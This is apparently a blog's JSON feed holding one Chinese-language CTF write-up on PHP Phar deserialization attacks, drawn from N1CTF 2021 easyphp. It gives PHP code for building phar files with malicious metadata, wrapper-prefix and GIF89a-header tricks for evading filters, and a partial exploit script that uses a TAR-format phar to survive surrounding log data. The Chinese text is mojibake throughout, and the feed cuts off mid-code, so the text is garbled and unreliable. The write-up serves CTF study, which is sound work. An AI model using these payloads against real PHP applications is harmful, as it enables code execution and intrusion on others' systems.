{
    "version": "https://jsonfeed.org/version/1",
    "title": "Cubic YÂ³ â€¢ All posts by \"php\" tag",
    "description": "Notes, CTF, DIY, thoughts and waifus.\n\nI'm CubicYYY, an undergraduate student majoring in Computer Science at Zhejiang University.\nâ¤â¤â¤ CTF, toy projects, electric guitar\nâœ–âœ–âœ– Technological supremacy\n\nRÃ©sumÃ©ğŸ‘‰ [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/resume&target=resume.tex&command=xelatex).",
    "home_page_url": "http://cubicy.icu",
    "items": [
        {
            "id": "http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/",
            "url": "http://cubicy.icu/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/",
            "title": "æµ…è°ˆPharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ï¼šN1CTF 2021 easyphp & å®‰æ´µæ¯2021 EZ_TP",
            "date_published": "2021-11-28T05:35:00.000Z",
            "content_html": "<h1 id=\"Phar\"><a href=\"#Phar\" class=\"headerlink\" title=\"Phar\"></a>Phar</h1><h2 id=\"ä»€ä¹ˆæ˜¯Phar\"><a href=\"#ä»€ä¹ˆæ˜¯Phar\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯Phar\"></a>ä»€ä¹ˆæ˜¯Phar</h2><blockquote>\n<p>PHp ARchive, like a Java JAR, but for PHP.</p>\n</blockquote>\n<p>pharï¼ˆPHp ARchiveï¼‰æ˜¯ç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ã€‚PHP â‰¥5.3å¯¹Pharåç¼€æ–‡ä»¶æ˜¯é»˜è®¤å¼€å¯æ”¯æŒçš„ï¼Œä¸éœ€è¦ä»»ä½•å…¶ä»–çš„å®‰è£…å°±å¯ä»¥ä½¿ç”¨å®ƒã€‚</p>\n<blockquote>\n<p>pharæ‰©å±•æä¾›äº†ä¸€ç§å°†æ•´ä¸ªPHPåº”ç”¨ç¨‹åºæ”¾å…¥.pharæ–‡ä»¶ä¸­çš„æ–¹æ³•ï¼Œä»¥æ–¹ä¾¿ç§»åŠ¨ã€å®‰è£…ã€‚.pharæ–‡ä»¶çš„æœ€å¤§ç‰¹ç‚¹æ˜¯å°†å‡ ä¸ªæ–‡ä»¶ç»„åˆæˆä¸€ä¸ªæ–‡ä»¶çš„ä¾¿æ·æ–¹å¼ï¼Œ.pharæ–‡ä»¶æä¾›äº†ä¸€ç§å°†å®Œæ•´çš„PHPç¨‹åºåˆ†å¸ƒåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­å¹¶ä»è¯¥æ–‡ä»¶ä¸­è¿è¡Œçš„æ–¹æ³•ã€‚</p>\n</blockquote>\n<p>è¯´ç™½äº†ï¼Œå°±æ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œä½†æ˜¯ä¸æ­¢èƒ½æ”¾å‹ç¼©æ–‡ä»¶è¿›å»ã€‚</p>\n<p>åœ¨åšè¿›ä¸€æ­¥æ¢ç©¶ä¹‹å‰éœ€è¦å…ˆè°ƒæ•´é…ç½®ï¼Œå› ä¸ºå¯¹äºPharæ–‡ä»¶çš„ç›¸å…³æ“ä½œï¼Œphpç¼ºçœçŠ¶æ€æ˜¯åªè¯»çš„ï¼ˆä¹Ÿå°±æ˜¯è¯´å•çº¯ä½¿ç”¨Pharæ–‡ä»¶ä¸éœ€è¦ä»»ä½•çš„è°ƒæ•´é…ç½®ï¼‰ã€‚ä½†æ˜¯å› ä¸ºæˆ‘ä»¬ç°åœ¨éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå·±çš„Pharæ–‡ä»¶ï¼Œæ‰€ä»¥éœ€è¦å…è®¸å†™å…¥Pharæ–‡ä»¶ï¼Œè¿™éœ€è¦ä¿®æ”¹ä¸€ä¸‹Â <code>php.ini</code></p>\n<p>æ‰“å¼€Â <code>php.ini</code>ï¼Œæ‰¾åˆ°Â <code>phar.readonly</code>Â æŒ‡ä»¤è¡Œï¼Œä¿®æ”¹æˆï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">phar.<span class=\"keyword\">readonly</span> = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p>å³å¯ã€‚</p>\n<hr>\n<h2 id=\"Pharæ–‡ä»¶æ ¼å¼\"><a href=\"#Pharæ–‡ä»¶æ ¼å¼\" class=\"headerlink\" title=\"Pharæ–‡ä»¶æ ¼å¼\"></a>Pharæ–‡ä»¶æ ¼å¼</h2><p>Pharæ–‡ä»¶ç”±å››éƒ¨åˆ†ç»„æˆï¼š</p>\n<p><strong>1.stub</strong></p>\n<p>stubæ˜¯pharæ–‡ä»¶çš„æ–‡ä»¶å¤´ï¼Œæ ¼å¼ä¸º<code>xxxxxx&lt;?php ...;__HALT_COMPILER();?&gt;</code>ï¼Œxxxxxxå¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼ŒåŒ…æ‹¬ç•™ç©ºï¼Œä¸”phpé—­åˆç¬¦ä¸æœ€åä¸€ä¸ªåˆ†å·ä¹‹é—´ä¸èƒ½æœ‰å¤šäºä¸€ä¸ªçš„ç©ºæ ¼ç¬¦ã€‚å¦å¤–phpé—­åˆç¬¦ä¹Ÿå¯çœç•¥ã€‚</p>\n<p><strong>2.manifest describing the contents</strong></p>\n<p>è¯¥åŒºåŸŸå­˜æ”¾pharåŒ…çš„å±æ€§ä¿¡æ¯ï¼Œå…è®¸æ¯ä¸ªæ–‡ä»¶æŒ‡å®šæ–‡ä»¶å‹ç¼©ã€æ–‡ä»¶æƒé™ï¼Œç”šè‡³æ˜¯ç”¨æˆ·å®šä¹‰çš„å…ƒæ•°æ®ï¼Œå¦‚æ–‡ä»¶ç”¨æˆ·æˆ–ç»„ã€‚</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/format.png\" loading=\"lazy\"></p>\n<p>è¿™é‡Œé¢çš„metadataä»¥serializeå½¢å¼å‚¨å­˜ï¼Œä¸ºååºåˆ—åŒ–æ¼æ´åŸ‹ä¸‹äº†ä¼ç¬”ã€‚</p>\n<p><strong>3.file contents</strong></p>\n<p>è¢«å‹ç¼©çš„ç”¨æˆ·æ·»åŠ çš„æ–‡ä»¶å†…å®¹</p>\n<p>4.<strong>signature</strong></p>\n<p>å¯é€‰ï¼Œpharæ–‡ä»¶çš„ç­¾åï¼Œå…è®¸çš„æœ‰MD5, SHA1, SHA256, SHA512å’ŒOPENSSL.</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/signature.png\" alt=\"signature\" loading=\"lazy\"></p>\n<p>è¿™éƒ¨åˆ†ä»¥<code>GBMB</code>ï¼ˆ47 42 4d 42ï¼‰ç»“å°¾ã€‚</p>\n<p>éœ€è¦æ³¨æ„ï¼Œstubä¸ä¸€å®šè¦åœ¨æ–‡ä»¶å¼€å¤´ã€‚</p>\n<h2 id=\"åˆ©ç”¨æ–¹å¼\"><a href=\"#åˆ©ç”¨æ–¹å¼\" class=\"headerlink\" title=\"åˆ©ç”¨æ–¹å¼\"></a>åˆ©ç”¨æ–¹å¼</h2><p>åœ¨2018 Black Hatä¸Šï¼Œå®‰å…¨ç ”ç©¶å‘˜<code>Sam Thomas</code>åˆ†äº«äº†è®®é¢˜<code>Itâ€™s a PHP unserialization vulnerability Jim, but not as we know it</code> .</p>\n<p><a href=\"https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf\">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a></p>\n<blockquote>\n<p>åˆ©ç”¨pharæ–‡ä»¶ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„<strong>meta-data</strong>è¿™ä¸€ç‰¹æ€§ï¼Œæ‹“å±•äº†phpååºåˆ—åŒ–æ¼æ´çš„æ”»å‡»é¢ã€‚è¯¥æ–¹æ³•åœ¨<strong>æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</strong>ï¼ˆfile_exists()ã€is_dir()ç­‰ï¼‰å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆ<strong>phar:&#x2F;&#x2F;ä¼ªåè®®</strong>ï¼Œ<strong>å¯ä»¥ä¸ä¾èµ–unserialize()ç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</strong>ã€‚</p>\n</blockquote>\n<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ä¼ å…¥ä»¥ä¸‹å‡½æ•°çš„å‚æ•°ï¼Œå°±æœ‰æ½œåœ¨çš„pharååºåˆ—åŒ–æ¼æ´åˆ©ç”¨å¯èƒ½ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/func.png\" loading=\"lazy\"></p>\n<p>è¿˜æœ‰ä¸€äº›åˆ«çš„å‡½æ•°å¯ç”¨ï¼Œå¯å‚è€ƒè¿™ç¯‡ï¼š<a href=\"https://www.freebuf.com/articles/web/205943.html\">https://www.freebuf.com/articles/web/205943.html</a></p>\n<p><strong>è¯•è¯•çœ‹ï¼Ÿ</strong></p>\n<p>æˆ‘ä»¬å…ˆæ¥ç”Ÿæˆä¸€ä¸ªpharï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;phar.phar&quot;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;phar.phar&quot;</span>); <span class=\"comment\">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//è®¾ç½®stub</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">TestObject</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>); <span class=\"comment\">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"comment\">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æ³¨æ„è¿™è¾¹$oååºåˆ—åŒ–åªä¼šä¿å­˜æ•°æ®ä¸ä¼šä¿å­˜æ–¹æ³•ã€‚æ‰§è¡Œå®Œæ¯•åï¼Œæˆ‘ä»¬æ¥è§‚å¯Ÿpharæ–‡ä»¶çš„å†…å®¹ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/hex.png\" loading=\"lazy\"></p>\n<p>GBMBç»“å°¾çš„ç­¾åä»¥åŠåºåˆ—åŒ–åçš„metadataæ¸…æ™°å¯è§ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TestObject</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Destruct called&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"string\">&#x27;phar://phar.phar/test.txt&#x27;</span>;<span class=\"comment\">//æ—¢ç„¶æ˜¯å‹ç¼©æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å¦‚æ­¤è®¿é—®å…¶ä¸­çš„æŸä¸ªæ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$filename</span>); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ä¸Šé¢çš„ç¨‹åºæ‰§è¡Œä¹‹åï¼Œæˆ‘ä»¬ä¼šå‘ç°å®ƒè¾“å‡ºäº†â€œDestruct calledâ€.è¿™æ˜¯ç”±äºpharè¢«è§£æçš„æ—¶å€™ï¼Œmetadataè¢«ååºåˆ—åŒ–äº†ï¼Œäºæ˜¯è¯¥å®ä¾‹è¢«ææ„æ—¶è°ƒç”¨__destructå‡½æ•°ã€‚è¿™ä¾¿æ˜¯ååºåˆ—åŒ–æ¼æ´çš„æ¥ç”±ã€‚</p>\n<p>PHP â‰¥5.3é»˜è®¤æ”¯æŒpharæ–‡ä»¶ï¼›è€Œåœ¨PHP8ä¸­ï¼Œè¯¥æ¼æ´è¢«ä¿®å¤ï¼šmetadataä¸ä¼šè‡ªåŠ¨è¢«ååºåˆ—åŒ–äº†ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰</p>\n<hr>\n<h2 id=\"phar-æ˜¯ä»€ä¹ˆ\"><a href=\"#phar-æ˜¯ä»€ä¹ˆ\" class=\"headerlink\" title=\"phar:&#x2F;&#x2F;æ˜¯ä»€ä¹ˆ\"></a><strong>phar:&#x2F;&#x2F;æ˜¯ä»€ä¹ˆ</strong></h2><p>å‰é¢æåˆ°ï¼Œæˆ‘ä»¬è§£æpharæ–‡ä»¶å¸¸å¸¸ä½¿ç”¨phar:&#x2F;&#x2F;ä¼ªåè®®ã€‚CTFä¸­ï¼Œç”±äºä¼ªåè®®æä¾›äº†ä¸€ç³»åˆ—å¯¹äºæ–‡ä»¶çš„å°è£…åè®®ï¼Œä½¿å¾—å½“æºç¨‹åºæœ‰å¯æ§çš„æ–‡ä»¶åŒ…å«å‡½æ•°æ—¶ï¼Œæˆ‘ä»¬æœ‰æœºä¼šåˆ©ç”¨è¿™äº›åè®®æ§åˆ¶å…¶è¿”å›å€¼æˆ–æ˜¯å®Œæˆä¸€äº›é¢„æ–™å¤–æ“ä½œï¼ˆä¾‹å¦‚ååºåˆ—åŒ–ï¼‰ã€‚ä½œä¸ºä¼ªåè®®çš„ä¸€ç§ï¼Œç”±äºpharæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å‹ç¼©æ–‡ä»¶ï¼Œæ‰€ä»¥phar:&#x2F;&#x2F;å’Œzip:&#x2F;&#x2F;å…¶å®æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ï¼Œéƒ½å¯ä»¥è®¿é—®å‹ç¼©åŒ…ä¸­çš„å­æ–‡ä»¶ï¼Œå¹¶ä¸”zip:&#x2F;&#x2F;éœ€è¦æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œphar:&#x2F;&#x2F;å¹¶ä¸éœ€è¦ã€‚ï¼ˆæ¥æºè¯·æ±‚ï¼‰</p>\n<hr>\n<h2 id=\"å°tricks\"><a href=\"#å°tricks\" class=\"headerlink\" title=\"å°tricks\"></a><strong>å°tricks</strong></h2><h3 id=\"ç»•è¿‡å‰ç¼€è¿‡æ»¤\"><a href=\"#ç»•è¿‡å‰ç¼€è¿‡æ»¤\" class=\"headerlink\" title=\"ç»•è¿‡å‰ç¼€è¿‡æ»¤\"></a>ç»•è¿‡å‰ç¼€è¿‡æ»¤</h3><p>é˜Ÿé‡Œå¸ˆå‚…çš„å‡ ä¸ªexampleå¯ä»¥ç±»æ¯”ä½¿ç”¨ï¼Œéƒ½æ˜¯åœ¨å‰ç¼€éphar:&#x2F;&#x2F;çš„æƒ…å†µä¸‹è°ƒç”¨äº†phar:&#x2F;&#x2F;</p>\n<p>compress.bzip2å’Œcompress.zlib</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$z</span> = <span class=\"string\">&#x27;compress.bzip2://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$z</span> = <span class=\"string\">&#x27;compress.zlib://phar:///home/sx/test.phar/test.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$z</span>);</span><br></pre></td></tr></table></figure>\n\n<p>php:&#x2F;&#x2F;</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://filter/read=convert.base64-encode/resource=phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"ç®€å•çš„ç»•è¿‡\"><a href=\"#ç®€å•çš„ç»•è¿‡\" class=\"headerlink\" title=\"ç®€å•çš„ç»•è¿‡\"></a>ç®€å•çš„ç»•è¿‡</h3><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨stubéƒ¨åˆ†å‰ç¼€ä»»æ„çš„ç‰¹æ€§ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$phar</span> -&gt; <span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&#x27;GIF89a&#x27;</span>.<span class=\"string\">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);   <span class=\"comment\">//è®¾ç½® stubï¼Œå¢åŠ  gif æ–‡ä»¶å¤´</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿™å¯ä»¥ç»•è¿‡ä¸€éƒ¨åˆ†å¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ã€‚</p>\n<hr>\n<h3 id=\"ç»•è¿‡å‰åè„æ•°æ®\"><a href=\"#ç»•è¿‡å‰åè„æ•°æ®\" class=\"headerlink\" title=\"ç»•è¿‡å‰åè„æ•°æ®\"></a>ç»•è¿‡å‰åè„æ•°æ®</h3><p>ç”±äºç­¾åéƒ¨åˆ†çš„å­˜åœ¨ï¼Œphpä¼šæ ¡éªŒæ–‡ä»¶å“ˆå¸Œå€¼ï¼Œå¹¶æ£€æŸ¥æœ«å°¾æ˜¯å¦ä¸ºGBMBï¼Œå¦‚ä¸‹æ˜¯è§£æéƒ¨åˆ†çš„æºç ï¼š</p>\n<p><img src=\"/2021/11/28/%E6%B5%85%E8%B0%88Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AN1CTF%202021%20easyphp%20&%20%E5%AE%89%E6%B4%B5%E6%9D%AF2021%20EZ_TP/src.png\" loading=\"lazy\"></p>\n<p><a href=\"https://github.dev/php/php-src\">https://github.dev/php/php-src</a></p>\n<p>å¯è§ï¼Œå¦‚æœæœ«å°¾ä¸æ˜¯GBMBä¼šç›´æ¥å¯¼è‡´è§£æå¤±è´¥ã€‚</p>\n<p>åœ¨CTFä¸­åˆ©ç”¨è¯¥æ¼æ´éœ€è¦æˆ‘ä»¬å®Œæˆå†™å…¥&#x2F;ä¸Šä¼ pharï¼Œå¹¶è°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ä¸€å¥è¯æœ¨é©¬ç”±äºæœ‰<code>&lt;?php ?&gt;</code>è¿™æ ·çš„å¤´å°¾æ ‡è¯†å­˜åœ¨ï¼Œå¯ä»¥æ— è§†å‰åè„æ•°æ®ï¼›ç„¶è€Œå¯¹äºpharï¼Œè¿™æ ·çš„éªšæ“ä½œè¢«ç­¾åéƒ¨åˆ†é˜»æ­¢äº†ã€‚æœ‰åŠæ³•ç»•è¿‡å—ï¼Ÿè¯·å‚é˜…ï¼š<a href=\"https://www.php.net/manual/zh/phar.converttoexecutable.php\">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p>\n<p>åˆ©ç”¨convertToExecutableå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpharæ–‡ä»¶è½¬ä¸ºå…¶ä»–æ ¼å¼çš„pharæ–‡ä»¶ï¼Œä¾‹å¦‚.tarå’Œ.zipæ ¼å¼ã€‚</p>\n<p>æˆ‘ä»¬ä»¥N1CTF easyphpä¸ºä¾‹å­ï¼Œè¿™é¢˜å…è®¸æˆ‘ä»¬å†™å…¥æ—¥å¿—ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–å¾—åˆ°flagï¼Œéš¾ç‚¹åœ¨äºæ—¥å¿—æ–‡ä»¶å‰åæœ‰é¢å¤–è„æ•°æ®ï¼Œä¼šä½¿å¾—æˆ‘ä»¬çš„pharæ–‡ä»¶æ— æ³•è¢«è§£æã€‚</p>\n<p>ç„¶è€Œå¦‚æœä»¥taræ ¼å¼å‚¨å­˜pharï¼Œæœ«å°¾çš„è„æ•°æ®å¹¶ä¸ä¼šå½±å“è§£æï¼ˆè¿™æ˜¯tarçš„æ ¼å¼å†³å®šçš„ï¼‰ï¼Œè€Œå¼€å¤´çš„è„æ•°æ®å¯ä»¥åœ¨åˆ¶é€ pharæ–‡ä»¶æ—¶å°±æå‰æ„é€ å¥½ï¼ˆè¿™æ ·è¿™éƒ¨åˆ†æ•°æ®ä¹Ÿä¼šè¢«çº³å…¥ç­¾åè®¡ç®—ï¼‰ï¼Œå†™å…¥æ—¥å¿—æ—¶ä¸å¿…å†™å…¥è¿™éƒ¨åˆ†ï¼Œè€Œæ˜¯ä»¤å…¶ä¸è„æ•°æ®æ‹¼æ¥å½¢æˆåˆæ³•çš„pharã€‚exploitå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  CLASS FLAG &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;FLAG: &quot;</span> . <span class=\"variable language_\">$this</span>-&gt;_flag;</span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$sb</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;sb&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$ts</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;ts&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"variable\">$sb</span>.<span class=\"string\">&quot;.phar&quot;</span>); <span class=\"comment\">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class=\"line\">    **<span class=\"variable\">$phar</span> = <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">convertToExecutable</span>(<span class=\"title class_\">Phar</span>::<span class=\"variable constant_\">TAR</span>); <span class=\"comment\">//ä¼šç”Ÿæˆ*.phar.tar**</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;Time: &quot;</span>.<span class=\"variable\">$ts</span>.<span class=\"string\">&quot; IP: [], REQUEST: [log_type=&quot;</span>.<span class=\"variable\">$sb</span>.<span class=\"string\">&quot;], CONTENT: [&quot;</span>, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class=\"line\">    <span class=\"comment\">//taræ–‡ä»¶å¼€å¤´æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ æ–‡ä»¶çš„çš„æ–‡ä»¶åï¼Œæ³¨æ„æ·»åŠ çš„æ–‡ä»¶é¡ºåºä¸è¦é”™äº†</span></span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class=\"comment\">//è®¾ç½®stub</span></span><br><span class=\"line\">    <span class=\"variable\">$o</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">FLAG</span>();</span><br><span class=\"line\">  <span class=\"variable\">$o</span> -&gt; data = <span class=\"string\">&#x27;g0dsp3ed_1s_g0D&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$o</span>); <span class=\"comment\">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class=\"line\">    <span 